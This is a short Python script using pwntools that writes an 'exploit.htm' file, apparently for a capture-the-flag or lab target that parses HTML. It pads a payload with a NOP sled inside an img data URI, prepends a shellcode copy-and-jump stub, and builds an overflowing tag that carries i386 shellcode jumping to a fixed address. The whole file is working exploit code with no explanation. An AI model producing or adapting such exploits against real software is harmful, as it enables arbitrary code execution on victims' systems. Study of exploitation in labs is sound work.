```python
#!/bin/python
from pwn import *

HEADER = b'<html><body>'
MAX_LENGTH=0x100000
ENTRY = 0x1A1
out = []
  
PAYLOAD_FILE='./programs/payload'
# PAYLOAD_FILE='./test'

with open(PAYLOAD_FILE, 'rb') as test:
 payload = test.read()

setup = asm('xor edi, edi')
setup += asm(f'mov ecx, {len(payload)}')
get_eip = asm('call $+5')
print(get_eip.hex(), len(get_eip))
setup += get_eip
setup += asm('pop esi')
setup += asm('add esi, 13')
setup += asm('rep movsb')
setup += asm(f'mov eax, {ENTRY}')
setup += asm(f'jmp eax')
print(7, len(setup), setup.hex())
payload = setup + payload
payload = (b'\x90'*(MAX_LENGTH-len(payload))) + payload

IMG = b'<img src="data:image/png;base64,'+  payload +   b'" />'

def nop(size):
  return b'\x90' * size

def tagger(tag):
  return b'<' + tag + b'/>'

def vtagger(tag):
  return tagger(b'a' + tag)

def ctagger(size):
  return tagger(cyclic(size))

def otagger(tag):
  padding = cyclic(0x1f)
  return tagger(padding+tag)

exploit = b'a'
exploit += nop(0xa)
exploit += b'\xac'
exploit += asm('jmp $-0x1d')
exploit += nop(4)
exploit += asm('xor eax, eax', arch='i386')
exploit += asm('mov al, 0x40', arch='i386')
exploit += asm('shl eax, 0x10', arch='i386')
exploit += asm('mov ax, 0x0101', arch='i386')
exploit += asm('jmp eax', arch='i386')
exploit += nop(0x20-len(exploit))
print(exploit.hex())
with open('exploit.htm', 'wb') as exploithtm:
  exploithtm.write(HEADER)
  exploithtm.write(tagger(exploit))
  exploithtm.write(IMG)
```
